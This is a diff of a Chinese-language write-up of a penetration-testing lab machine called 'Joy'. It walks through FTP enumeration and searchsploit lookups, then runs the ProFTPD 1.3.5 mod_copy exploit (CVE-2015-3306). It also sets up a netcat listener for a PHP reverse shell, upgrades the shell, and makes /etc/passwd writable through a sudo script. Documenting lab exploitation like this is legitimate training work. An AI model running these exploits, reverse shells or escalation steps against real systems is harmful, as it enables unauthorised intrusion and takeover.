@@ -177,7 +177,7 @@ ftp> ls
 -rwxrwxr-x   1 ftp      ftp            24 Jan  6  2019 reminder
 226 Transfer complete
 ```
->upload里面有很多东西, 逐个抓来看看
+upload里面有很多东西, 逐个抓来看看
 ```
 └─$ wc * | sort 
   0   0   0 project_armadillo
@@ -239,6 +239,7 @@ rhinoceros
 pondskater
 Lock down this machine!
 ```
+
 <br>在目前以上的信息暂时没有用, 继续往下探索
 <br>
 访问一下web界面看看
@@ -250,6 +251,7 @@ Lock down this machine!
 
 <br> 通过左上角的logo可以看到这是一个OSSEC的平台, 并且版本为0.8, 那我们searchsploit看看有没有什么可利用的漏洞
 <br> 诶, 有的
+
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.62]
 └─$ searchsploit ossec                     
@@ -264,6 +266,7 @@ Shellcodes: No Results
                                                               
 ```
 <br>那就直接使用试试, 还正好对上了版本号
+
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.62/script]
 └─$ searchsploit -m php/dos/37728.py     
@@ -282,8 +285,10 @@ Copied to: /home/aacai/Desktop/192.168.146.62/script/37728.py
 Connection failed.
 
 ```
+
 <br>好吧.. 没用, 更换思路
 <br>我重新回想了一下, 刚刚ftp里面有一个directory目录, 赶回去看看
+
 ```
 └─$ ftp 192.168.146.62       
 Connected to 192.168.146.62.
@@ -392,8 +397,10 @@ Information of this Machine!
 Linux JOY 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
 
 ```
+
 <br>在这里我看到了一个叫version_control的文件
 <br>尝试使用telnet拷贝到upload文件夹里面查看文件内容
+
 ```
 └─$ telnet 192.168.146.62 21                                                                                                        1 ⨯
 Trying 192.168.146.62...
@@ -412,7 +419,9 @@ exit
 221 Goodbye.
 Connection closed by foreign host.
 ```
+
 <br>再去ftp里面下载下来
+
 ```
 └─$ ftp 192.168.146.62
 Connected to 192.168.146.62.
@@ -482,7 +491,9 @@ Note that we have some other configurations in this machine.
 2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.
 
 ```
+
 <br> 在这里我们得到了几个版本信息, 并且web的主目录迁移到了/var/www/tryingharderisjoy, 可能这几个application里面带有漏洞, 使用searchexploit试试
+
 ```
 └─$ searchsploit proftpd 1.3.5
 --------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -499,7 +510,9 @@ Shellcodes: No Results
 
 ```
 ### 利用漏洞部分
+
 <br>通过searchsploit查看到有远程代码执行的漏洞, 下载下来尝试使用
+
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.62]
 └─$ python 36803.py 192.168.146.62 /var/www/tryingharderisjoy id
@@ -548,7 +561,7 @@ Dockerfile  exploit.py  LICENSE  main.sh  README.md
 └─$ 
 
 ```
->接下来尝试利用
+接下来尝试利用
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.62/exploit-CVE-2015-3306]
 └─$ ./exploit.py --host 192.168.146.62 --port 21 --path "/var/www/tryingharderisjoy"
@@ -562,6 +575,7 @@ Dockerfile  exploit.py  LICENSE  main.sh  README.md
 └─$ 
 
 ```
+
 *It's working!!!*
 <br>接下来试试输入命令
 ![Img](./FILES/Joy/img-20220714150445.png)
@@ -570,13 +584,13 @@ Dockerfile  exploit.py  LICENSE  main.sh  README.md
 ![Img](./FILES/Joy/img-20220714150525.png)
 <br>nc并没有回显, 那就只能用php了
 
->先在本地起个监听
+先在本地起个监听
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.62/exploit-CVE-2015-3306]
 └─$ nc -nvlp 4444                 
 listening on [any] 4444 ...
 ```
->去生成一个php的反弹shell命令
+去生成一个php的反弹shell命令
 https://sentrywhale.com/documentation/reverse-shell
 
 ```
@@ -646,10 +660,14 @@ $
 
 ```
 <br>通过目录的枚举, 可以看到在这里面包含了一个patrick用户的密码
-
->由于我拿到的是一个简单的shell交互, 不能进行sh登录, 于是我去google了一下, 发现了一个新方法, 分享给大家
+<br>
+由于我拿到的是一个简单的shell交互, 不能进行sh登录, 于是我去google了一下, 发现了一个新方法, 分享给大家
+<br>
 https://forum.hackthebox.com/t/su-must-be-run-from-a-terminal/1458/4
+<br>
 只需要一条命令就可以变成功能较完整的shell界面
+<br>
+
 ```
 /usr/bin/script -qc /bin/bash /dev/null
 $ /usr/bin/script -qc /bin/bash /dev/null
@@ -710,9 +728,13 @@ ls -al | grep "script"
 d---------  2 root    root    4096 Jan  9  2019 script
 patrick@JOY:~$ 
 ```
->但是在这里我们没办法直接访问里面的东西
+<br>
+但是在这里我们没办法直接访问里面的东西
+<br>
 尝试访问, 它竟然是一个交互式的sh文件
+<br>
 直接让/etc/passwd变成可编辑的文件
+<br>
 ```
 patrick@JOY:~$ sudo script/test
 sudo script/test
